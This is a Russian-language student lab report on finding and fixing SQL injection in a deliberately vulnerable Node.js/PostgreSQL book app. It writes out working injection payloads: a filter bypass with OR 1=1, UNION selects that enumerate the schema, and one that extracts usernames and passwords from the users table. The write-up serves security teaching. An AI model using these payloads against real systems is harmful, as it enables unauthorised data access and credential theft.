# Лабораторная работа №2
> Цель работы: Поиск и устранение SQL Injection.

## Задание
В папке ``lab2`` находится ``nodejs`` уязвимое приложение. Необходимо развернуть его, найти SQL инъекцию и исправить. Модифицированное приложение загрузить в свой репозиторий GitHub.  
Для выполнения лабораторной потребуется проделать следующие шаги:  
1. Установить PostgreSQL сервер любой версии

![image](https://user-images.githubusercontent.com/96451409/147068507-9161d4c9-78cf-4702-a971-ec296f1814d0.png)

2. Создать БД ``lib``  

![image](https://user-images.githubusercontent.com/96451409/147068563-dea96d73-bfc0-4c6c-9f4b-ce13d8335187.png)

3. Применить к ней скрипты из папки ``db`` (либо создать объекты и вставить данные в таблицы руками). Скрипты выполнять в порядке указанном в имени файла.

![image](https://user-images.githubusercontent.com/96451409/147068600-416e62d4-ea8e-47fd-8f97-dc5d671099bb.png)

![image](https://user-images.githubusercontent.com/96451409/147068612-16edafed-895c-4dc7-ab77-fbe393d51e11.png)

3.1 Восстановить данные из файла ``data.sql``

При применении скрипта data.sql из-за присутствия кириллицы названия сбились, исправили их через pgAdmin:

![image](https://user-images.githubusercontent.com/96451409/147068777-609bb048-1783-4f8f-b444-f26188eca63f.png)

![image](https://user-images.githubusercontent.com/96451409/147068786-264985ba-5b9e-4308-ba68-14e6b765a695.png)

4. Установить ``nodejs`` версии 14.
5. Перейти в папку ``lab2`` и выполнить в ней команду ``npm install``.

![image](https://user-images.githubusercontent.com/96451409/147068920-10469168-8511-4f20-b862-7f8503f161ab.png)

6. Запустить сайт через Visual Studio Code или через команду ``npm start``.

![image](https://user-images.githubusercontent.com/96451409/147068937-935ff29f-112b-44db-9472-e49c9583d917.png)

7. Войти на сайт и увидеть список книг и авторов

![image](https://user-images.githubusercontent.com/96451409/147068969-c0ea0e30-ea12-40a9-aac4-eeaf9c29133e.png)

8. Обнаружить sql инъекцию

Введем "1'" и проверим результат поиска:

![image](https://user-images.githubusercontent.com/96451409/147069095-25792c26-b82b-4d2a-81db-64eaea1d67ce.png)

9. Написать отчёт с описанием найденной уязвимости и примерами её эксплуатации 9.1. Обход установленного фильтра 9.2. Получение данных из другой таблицы 9.3. Похищение пароля пользователя

Проверим возможность обхода установленного фильтра при вводе конструкции с символами комментирования «--»:

Обход фильтра при использовании конструкции: _**1000 ‘ OR 1 = 1 -- .**_

![image](https://user-images.githubusercontent.com/96451409/147069245-534edc2f-3fbc-4787-af3d-a867002037a3.png)

Теперь, например, посмотрим версию базы данных и имя пользователя:

_**'union select 0,version(), user --**_

![image](https://user-images.githubusercontent.com/96451409/147069307-fc45acec-2730-4177-8400-1b219a31697e.png)

Воспользуемся типичным видом развития атаки и получим имен таблиц и колонок базы данных, включая системные:

_**'union select 0,table_name, column_name from information_schema.columns --**_
 
 ![image](https://user-images.githubusercontent.com/96451409/147069369-d89775d6-c688-4fff-be13-1582ef9ca725.png)

![image](https://user-images.githubusercontent.com/96451409/147069390-37012eb3-15a0-4589-bf79-99610e7ea1e4.png)

 Можем отдельно получить данные из таблицы book:
 
_**'union select id, name, null from book--**_

![image](https://user-images.githubusercontent.com/96451409/147069427-00800808-a945-47e2-8e21-f91246830ee3.png)

Найдем информацию о таблице users: Видим, что таблица users имеет два столбца, pass и name с текстовым типом данных:

_**'union select 0, column_name, data_type from information_schema.columns where table_name = 'users'--**_

![image](https://user-images.githubusercontent.com/96451409/147069759-765a4e37-3c5b-41bd-9e7c-5e818699ca47.png)

Похитим пароль пользователя:

_**'union select 0, name, pass from public.users--**_

![image](https://user-images.githubusercontent.com/96451409/147069969-47ba3d68-77b1-4cdb-bc3b-5b891e813c6e.png)

10. Исправить уязвимость. 10.1 В отчёте привести пример того, что уязвимости больше не эксплуатируются

![image](https://user-images.githubusercontent.com/96451409/147070025-6ba80e3c-6f4e-4192-a03e-2f0ac4c9f011.png)

![image](https://user-images.githubusercontent.com/96451409/147070082-f67d26c9-936d-4356-b5f0-4abc56b64623.png)
